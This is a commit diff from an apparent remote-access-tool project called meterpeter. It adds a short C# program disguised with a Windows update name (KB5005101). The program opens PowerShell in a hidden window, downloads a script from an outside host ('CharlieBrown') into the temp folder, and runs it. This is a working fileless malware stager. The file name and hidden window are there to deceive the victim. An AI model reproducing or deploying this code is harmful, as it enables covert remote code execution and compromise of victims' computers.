9ff66d7eb20af5c676bd126934492d3f1955db0f
pedro ubuntu <r00t-3xp10it@users.noreply.github.com>
2022-01-23 15:37:45 +0000

    meterpeter v2.10.11 - CScrandle fileless standalone executable

---
+++ mimiRatz/FileLess_KB5005101.cs
@@ -0,0 +1,17 @@
+﻿using System.Diagnostics;
+namespace Console
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+           var filePath = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
+
+           Process process = new Process();
+           process.StartInfo.FileName = filePath;
+           process.StartInfo.Arguments = "cd $Env:TMP;iwr -uri http://CharlieBrown/Update-KB5005101.ps1 -outfile Update-KB5005101.ps1;powershell -File Update-KB5005101.ps1";
+           process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+           process.Start();
+        }
+    }
+}
